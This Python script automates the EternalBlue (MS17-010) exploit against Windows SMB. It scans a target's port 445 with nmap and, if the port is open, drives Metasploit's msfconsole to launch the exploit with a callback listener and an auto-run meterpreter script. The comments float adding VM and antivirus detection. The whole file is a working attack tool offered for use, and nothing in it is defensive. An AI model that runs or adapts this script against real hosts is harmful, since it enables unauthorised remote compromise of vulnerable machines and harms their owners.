#! /usr/bin/python3

# Requires python3, nmap, & Metasploit. Script automates exploitation of Eternal Blue vulnerability. Closes 
# metasploit when done. Use meterscript document to list commands.

import subprocess
from subprocess import Popen, PIPE, STDOUT


target_ip = "10.10.10.10" ## ENTER TARGET IP HERE
target_port1 = "445" ## ENTER TARGET PORT
target_port = "445/tcp" ## ENTER HOW PORT APPEARS IN NMAP

listening_ip = "10.10.10.10" ## ENTER LISTENING IP
listening_port = "8888" ## ENTER LISTENING PORT

meter_script_path = "/path/to/meterscript.txt" ## --> Separate document. ENTER SAME PATH AS THIS SCRIPT

#run nmap
a = subprocess.run(["nmap", f"{target_ip}", "-p", f"{target_port1}"], stdout=subprocess.PIPE)
b = a.stdout.decode('utf-8')

#Idea: Scan to see if system is inside a VM or if there is an AV
#Idea: Convert target_port into list of ports, then check with a for loop if port is present..?
if target_port in b:
    print("Found target port(s)")

    #run metasploit
    p = Popen(['msfconsole'], stdout=PIPE, stdin=PIPE, stderr=PIPE)
    stdout_data = p.communicate(input=f'use exploit/windows/smb/ms17_010_eternalblue \n \
        set rhosts {target_ip} \n set rport {target_port1} \n set lhost {listening_ip} \n \
        set lport {listening_port} \n set AutoRunScript {meter_script_path} \n run \
        '.encode())[0]
    raw_text = stdout_data.decode('utf-8')
    print(raw_text)

'''
    # Potential improvement. This gives an indentation error.
    commands = ["use exploit/windows/smb/ms17_010_eternalblue", "set rhosts {target_ip}", 
        "set rport {target_port1}", "set lhost {listening_ip}","set lport {listening_port}",
        "AutoRunScript {meter_script_path}","run"]
    p = Popen(['msfconsole'], stdout=PIPE, stdin=PIPE, stderr=PIPE)
    stdout_data = p.communicate(f'\n'.join(commands))
    raw_text = stdout_data.decode('utf-8')
    print(raw_text)
'''